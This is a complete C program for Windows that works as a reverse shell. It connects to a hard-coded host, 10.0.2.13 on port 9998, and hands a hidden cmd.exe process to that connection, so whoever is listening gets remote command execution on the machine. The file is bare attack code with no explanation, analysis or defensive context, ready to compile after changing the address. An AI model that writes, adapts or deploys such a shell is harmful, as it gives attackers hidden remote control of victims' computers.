#include <stdio.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
SOCKET sck;
struct sockaddr_in addr;
STARTUPINFO s_info = { 0 };
PROCESS_INFORMATION p_info;

int main() {

	char ip[] = "10.0.2.13";
	short port = 9998;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	sck = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	addr.sin_family = AF_INET;
	InetPton(AF_INET, ip, &(addr.sin_addr.s_addr));
	addr.sin_port = htons(port);

	WSAConnect(sck, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

	s_info.cb = sizeof(s_info);
	s_info.dwFlags = STARTF_USESTDHANDLES;
	s_info.wShowWindow = SW_HIDE;
	s_info.hStdInput = s_info.hStdOutput = s_info.hStdError = (HANDLE)sck;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
	exit(0);
}
